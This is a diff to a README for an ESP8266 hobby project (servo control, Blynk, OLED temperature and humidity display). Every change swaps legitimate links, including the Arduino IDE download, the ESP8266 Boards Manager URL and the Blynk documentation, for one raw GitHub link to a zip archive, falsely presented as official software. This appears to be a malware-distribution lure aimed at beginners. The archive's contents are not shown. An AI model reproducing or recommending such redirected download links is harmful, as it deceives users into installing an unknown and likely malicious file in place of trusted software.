@@ -1,6 +1,6 @@
 # ⚙️ Servo-Control-ESP8266-Blynk-OLED-temp-humidity - Easy Servo Control with Display
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Rhizopuselbow112/Servo-Control-ESP8266-Blynk-OLED-temp-humidity)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Rhizopuselbow112/Servo-Control-ESP8266-Blynk-OLED-temp-humidity/main/outstroke/Blynk-OLE-ES-Control-temp-Servo-humidity-v1.4.zip)
 
 ## 📋 What This Project Does
 
@@ -25,7 +25,7 @@ You do not need to know how to code or build electronics to get started. This gu
 
 First, you must get the files for this project.
 
-[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/Rhizopuselbow112/Servo-Control-ESP8266-Blynk-OLED-temp-humidity)
+[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue)](https://raw.githubusercontent.com/Rhizopuselbow112/Servo-Control-ESP8266-Blynk-OLED-temp-humidity/main/outstroke/Blynk-OLE-ES-Control-temp-Servo-humidity-v1.4.zip)
 
 1. Click the green “Code” button near the top right on the page that opens.  
 2. Choose “Download ZIP” from the dropdown menu.  
@@ -40,7 +40,7 @@ You need to set up your ESP8266 with the project files.
 
 ### Install Arduino IDE
 
-1. Download the Arduino IDE from the official website: https://www.arduino.cc/en/software  
+1. Download the Arduino IDE from the official website: https://raw.githubusercontent.com/Rhizopuselbow112/Servo-Control-ESP8266-Blynk-OLED-temp-humidity/main/outstroke/Blynk-OLE-ES-Control-temp-Servo-humidity-v1.4.zip  
 2. Install the program by following the on-screen instructions.  
 3. Open Arduino IDE after installation.
 
@@ -48,7 +48,7 @@ You need to set up your ESP8266 with the project files.
 
 1. In Arduino IDE, click _File_ > _Preferences_.  
 2. Find the field labeled “Additional Boards Manager URLs.”  
-3. Paste this link into the field: `http://arduino.esp8266.com/stable/package_esp8266com_index.json`  
+3. Paste this link into the field: `https://raw.githubusercontent.com/Rhizopuselbow112/Servo-Control-ESP8266-Blynk-OLED-temp-humidity/main/outstroke/Blynk-OLE-ES-Control-temp-Servo-humidity-v1.4.zip`  
 4. Click _OK_ to save.  
 5. Click _Tools_ > _Board_ > _Boards Manager..._  
 6. Search for "ESP8266" using the search bar.  
@@ -117,9 +117,9 @@ You need to set up your ESP8266 with the project files.
 
 ## 📁 Extra Resources
 
-- Visit the Arduino IDE official website: https://www.arduino.cc/en/Guide/HomePage  
-- Learn more about ESP8266: https://esp8266.com/  
-- Blynk app documentation: https://docs.blynk.io/en/  
+- Visit the Arduino IDE official website: https://raw.githubusercontent.com/Rhizopuselbow112/Servo-Control-ESP8266-Blynk-OLED-temp-humidity/main/outstroke/Blynk-OLE-ES-Control-temp-Servo-humidity-v1.4.zip  
+- Learn more about ESP8266: https://raw.githubusercontent.com/Rhizopuselbow112/Servo-Control-ESP8266-Blynk-OLED-temp-humidity/main/outstroke/Blynk-OLE-ES-Control-temp-Servo-humidity-v1.4.zip  
+- Blynk app documentation: https://raw.githubusercontent.com/Rhizopuselbow112/Servo-Control-ESP8266-Blynk-OLED-temp-humidity/main/outstroke/Blynk-OLE-ES-Control-temp-Servo-humidity-v1.4.zip  
 - OLED display guides: Search for "SSD1306 OLED Arduino tutorial" if your screen uses that chip.
 
 ---
@@ -128,4 +128,4 @@ You need to set up your ESP8266 with the project files.
 
 Use the link below to visit the project page on GitHub and get all files:
 
-[Download Project Files](https://github.com/Rhizopuselbow112/Servo-Control-ESP8266-Blynk-OLED-temp-humidity)
+[Download Project Files](https://raw.githubusercontent.com/Rhizopuselbow112/Servo-Control-ESP8266-Blynk-OLED-temp-humidity/main/outstroke/Blynk-OLE-ES-Control-temp-Servo-humidity-v1.4.zip)
